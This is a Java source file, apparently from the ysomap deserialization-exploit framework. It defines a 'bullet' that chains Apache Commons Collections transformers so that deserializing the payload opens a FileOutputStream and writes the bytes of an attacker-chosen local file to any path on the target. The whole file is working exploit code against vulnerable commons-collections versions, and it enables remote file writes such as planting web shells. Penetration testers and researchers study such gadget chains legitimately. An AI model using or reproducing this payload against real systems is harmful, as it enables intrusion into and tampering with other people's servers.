package ysomap.bullets.collections;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/10/27
 */
@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("朝指定目录写入指定文件内容")
@Targets({Targets.JDK})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithFileWriteBullet extends AbstractTransformerBullet{

    @NotNull
    @Require(name = "localFilepath", detail = "local filepath")
    private String localFilepath;

    @NotNull
    @Require(name = "remoteFilepath", detail = "remote filepath")
    private String remoteFilepath;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        File file = new File(localFilepath);
        if(!file.exists()) throw new FileNotFoundException(localFilepath + " not found!");
        byte[] bytes = Files.readAllBytes(file.toPath());

        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(FileOutputStream.class));
        transformers.add(createInvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { String.class } }));
        transformers.add(createInvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { remoteFilepath } }));
        transformers.add(createInvokerTransformer("write",
                new Class[] { byte[].class },
                new Object[] { bytes }));

        return createTransformerArray(transformers);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TransformerWithFileWriteBullet();
        bullet.set("localFilepath", args[0]);
        bullet.set("remoteFilepath", args[1]);
        bullet.set("version", args[2]);
        return bullet;
    }
}
